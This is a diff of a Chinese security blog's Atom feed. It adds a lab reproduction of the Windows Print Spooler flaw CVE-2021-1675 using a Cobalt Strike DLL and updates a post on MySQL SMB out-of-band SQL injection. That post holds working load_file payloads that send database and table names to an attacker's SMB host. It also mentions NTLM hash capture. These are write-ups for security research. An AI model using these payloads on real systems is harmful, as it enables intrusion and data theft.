@@ -6,7 +6,7 @@
   <link href="http://422926799.github.io/atom.xml" rel="self"/>
   
   <link href="http://422926799.github.io/"/>
-  <updated>2021-06-29T14:27:51.737Z</updated>
+  <updated>2021-06-30T19:28:19.931Z</updated>
   <id>http://422926799.github.io/</id>
   
   <author>
@@ -17,11 +17,34 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>CVE-2021-1675复现</title>
+    <link href="http://422926799.github.io/posts/c257aa46.html"/>
+    <id>http://422926799.github.io/posts/c257aa46.html</id>
+    <published>2021-06-30T19:15:07.000Z</published>
+    <updated>2021-06-30T19:28:19.931Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><blockquote><p>Windows Print Spooler 远程代码执行漏洞<br>CVE-2021-1675<br>安全漏洞<br>发布时间：2021 年 6 月 8 日 最后更新：2021 年 6 月 21 日<br>分配 CNA：<br>微软<br>MITRE CVE-2021-1675<br>CVSS：3.0 7.8 / 6.8</p></blockquote><p>影响范围:Windows Server 2012-Windows Server 2019</p><p>官方链接:<a href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-1675" target="_blank" rel="noopener">https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-1675</a></p><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><p>Windows Server 2019<br>域控版本:Windows Server 2016<br><img src="https://z3.ax1x.com/2021/07/01/RDr0QU.png" alt=""></p><p>需一个普通的域用户<br><img src="https://z3.ax1x.com/2021/07/01/RDrdzT.png" alt=""></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>目前有的exp一共有两个，一个是py的一个是cpp写的<br><a href="https://github.com/hayasec/PrintNightmare" target="_blank" rel="noopener">https://github.com/hayasec/PrintNightmare</a><br><a href="https://github.com/cube0x0/CVE-2021-1675" target="_blank" rel="noopener">https://github.com/cube0x0/CVE-2021-1675</a></p><p>至于第二个py的，我这impacket环境报错<br><img src="https://z3.ax1x.com/2021/07/01/RDraWV.png" alt=""></p><p>第一个PrintNightmare下载下来后需要改两个地方，第112行的驱动路径UNIDRV.DLL，需要手动确定位置<br><img src="https://z3.ax1x.com/2021/07/01/RDrByF.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/07/01/RDrDL4.png" alt=""></p><p>搜索有关old关键词的路径，替换为<code>C:\\Windows\\System32\\spool\\drivers\\x64\\%s</code>，一共有3处<br><img src="https://z3.ax1x.com/2021/07/01/RDrseJ.png" alt=""></p><p>msf或cs生成个x64的dll（填的驱动路径是amd64对应64位），丢到smb。smb需要可以匿名访问/或者直接丢虚拟机里本地路径也行<br>执行即可成功上线cs<br><img src="https://z3.ax1x.com/2021/07/01/RDryw9.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/07/01/RDrgF1.png" alt=""></p><p>这里还顺便踩了smb的坑，用自带的smb服务，不要用imapcket的smbserver.py。否则会报句柄错误</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;漏洞介绍&quot;&gt;&lt;a href=&quot;#漏洞介绍&quot; class=&quot;headerlink&quot; title=&quot;漏洞介绍&quot;&gt;&lt;/a&gt;漏洞介绍&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;Windows Print Spooler 远程代码执行漏洞&lt;br&gt;CVE-2021-1675&lt;b</summary>
+      
+    
+    
+    
+    
+    <category term="域渗透" scheme="http://422926799.github.io/tags/域渗透/"/>
+    
+  </entry>
+  
+  <entry>
     <title>mysql smb外带注入</title>
     <link href="http://422926799.github.io/posts/af61cc76.html"/>
     <id>http://422926799.github.io/posts/af61cc76.html</id>
     <published>2021-06-29T14:19:23.000Z</published>
-    <updated>2021-06-29T14:27:51.737Z</updated>
+    <updated>2021-06-29T14:28:09.743Z</updated>
     
     <content type="html"><![CDATA[<p>需求：secure_file_priv为空，目标系统为windows<br>smb设置如下：</p><pre><code>找到 security = user ， 旧版本将user 改为share，这里我用的新版本，需要在后面添加：map to guest = Bad User新设置一个smbsmb日志:/var/log/samba</code></pre><p><img src="https://z3.ax1x.com/2021/06/29/RwuE9S.png" alt=""></p><p>smb外带注入与DNS外带注入比较:</p><ol><li>smb外带注入 可以一次性提交更大长度的字符，经测试长度在120是没有问题的，而dns前缀最多是63个字符。而且对特殊字符的兼容性比较好，目前测试发现 *是不行的，其他还有待fuzz。</li><li>smb外带注入不依赖于dns，可以绕过目前流量监测设备对异常域名前缀的捕获，可以直接使用ip，不需要dns请求。</li></ol><p>构造sql语句：</p><pre><code>select load_file(concat(&quot;\\\\&lt;IP&gt;\\&quot;,(SQL语句),&quot;\\xxx&quot;))为了方便从log里提取查询的内容，可以构造如下语句select load_file(concat(&quot;\\\\10.23.79.94\\yayi[&quot;,database(),&quot;]\\1.txt&quot;));</code></pre><p><img src="https://z3.ax1x.com/2021/06/29/RwuJc4.png" alt=""></p><p>查询当前数据库里的表</p><pre><code>1. 使用limit2. substring截断</code></pre><p>使用limit请先获取总共的表数</p><pre><code>select load_file(concat(&quot;\\\\10.23.79.94\\yayi[&quot;,(select count(table_name) from information_schema.tables where table_schema=database()),&quot;]\\1.txt&quot;));</code></pre><p>再用limit逐个查询</p><pre><code>select load_file(concat(&quot;\\\\10.23.79.94\\yayi[&quot;,(select table_name from information_schema.tables where table_schema=database() limit 0,1),&quot;]\\1.txt&quot;));</code></pre><p><img src="https://z3.ax1x.com/2021/06/29/RwKS8U.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/29/RwKp2F.png" alt=""></p><p>substring截断<br>截断到120字符串即可</p><pre><code>select load_file(concat(&quot;\\\\10.23.79.94\\yayi[&quot;,(select substring((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,120)),&quot;]\\1.txt&quot;));</code></pre><p><img src="https://z3.ax1x.com/2021/06/29/RwKAV1.png" alt=""></p><p>还有另外种方法就是利用smb获取ntlm hash，适用于知道目标一定的凭证。利用responder获取ntlm v2然后爆破<br><img src="https://z3.ax1x.com/2021/06/29/RwKUxg.png" alt=""></p><p>参考链接:<a href="http://moonslow.com/article/smb_sql_injection" target="_blank" rel="noopener">http://moonslow.com/article/smb_sql_injection</a></p>]]></content>
     
@@ -434,28 +457,6 @@ map to guest = Bad </summary>
     
     
     <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>FastAdmin前台文件上传复现</title>
-    <link href="http://422926799.github.io/posts/de1b4dd1.html"/>
-    <id>http://422926799.github.io/posts/de1b4dd1.html</id>
-    <published>2021-04-03T15:58:51.000Z</published>
-    <updated>2021-04-03T16:22:45.434Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>漏洞发生于：2021年/4月1号<br>漏洞点：application\api\controller\Common.php<br>触发漏洞的url：/index/ajax/upload<br>要求：application\extra\upload.php里的chunking为true (分片上传为true)<br><img src="https://z3.ax1x.com/2021/04/04/cuYe9x.png" alt=""></p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>漏洞点分析<br>需要包括以下的post请求参数才行<br>1.chunkid参数<br>2.action参数<br>3.chunkindex参数<br>4.chunkcount参数<br>5.filename参数<br><img src="https://z3.ax1x.com/2021/04/04/cuYG4I.md.png" alt=""></p><p>随后进入if判断，当action参数不为merge或method不为clean的时候。调用chunk函数chunk($chunkid, $chunkindex, $chunkcount);进入分片文件上传<br><img src="https://z3.ax1x.com/2021/04/04/cuYDEj.md.png" alt=""></p><p>跟进chunk函数，<br>1.首先$destDir=RUNTIME_PATH/chunks路径, RUNTIME=ROOT_PATH . ‘runtime’ . DS (DS=根据系统的文件分隔符)<br><img src="https://z3.ax1x.com/2021/04/04/cuYrUs.md.png" alt=""></p><p>2.$fileName=$chunkid-$chunindex.part //$chunkid和$chunindex都可控<br>3.$destDir=$destDir.DS.$fileName //拼接得到最后文件路径<br>4.判断RUNTIME_PATH/chunks路径是否存在，不存在则创建文件夹<br>5.将临时文件移动到RUNTIME_PATH/chunks路径下<br><img src="https://z3.ax1x.com/2021/04/04/cuYhb4.md.png" alt=""></p><p>之后触发merge函数，写shell<br>要求action参数为merge<br><img src="https://z3.ax1x.com/2021/04/04/cutQzV.md.png" alt=""></p><p>首先chunkDir变量来自于下图<br>$chunkDir=RUNTIME_PATH . ‘chunks’<br><img src="https://z3.ax1x.com/2021/04/04/cut3sU.md.png" alt=""></p><p>1.$filePath=RUNTIME_PATH . ‘chunks’.DS.$chunkid //$chunkid参数可控<br>2.根据$chunkcount变量进行循环<br>3.判断$filePath-$i-.part文件是否存在<br>4.如果文件存在，在/runtime/chunks路径下创建以$filepath作为文件名的文件$destFile=@fopen($uploadPath, “wb”)<br>5.锁定文件<br>6.根据$chunkcount参数循环 //$chunkcount参数可控<br>7.$partFile=$filePath-$i-.part<br>8.循环读取$partFile内容，写入文件到$filepath<br>9.读取完文件后，删除分片文件，释放文件锁定，关闭文件句柄<br><img src="https://z3.ax1x.com/2021/04/04/cutDsO.md.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/04/04/cutrLD.md.png" alt=""></p><p>exp分析:<br><img src="https://z3.ax1x.com/2021/04/04/cut2FA.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/04/04/cut4Qf.png" alt=""></p><p>exp地址:<a href="https://github.com/exp1orer/FastAdmin_Upload" target="_blank" rel="noopener">https://github.com/exp1orer/FastAdmin_Upload</a></p><p><img src="https://z3.ax1x.com/2021/04/04/cut5y8.png" alt=""></p><p>至于这里的shell地址为什么是根目录，因为这个exp是这么写的<br><img src="https://z3.ax1x.com/2021/04/04/cutjS0.md.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://zhuanlan.zhihu.com/p/57166400" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/57166400</a><br><a href="https://xz.aliyun.com/t/9395" target="_blank" rel="noopener">https://xz.aliyun.com/t/9395</a><br><a href="https://mp.weixin.qq.com/s/otrH75ZjCHBQbRB7g5DdWg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/otrH75ZjCHBQbRB7g5DdWg</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h2 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h2&gt;&lt;p&gt;漏洞发生于：2021年/4月1号&lt;br&gt;漏洞点：application\api\controller\Common.php&lt;br&gt;触发漏洞的</summary>
-      
-    
-    
-    
-    
-    <category term="代码审计" scheme="http://422926799.github.io/tags/代码审计/"/>
     
   </entry>
   
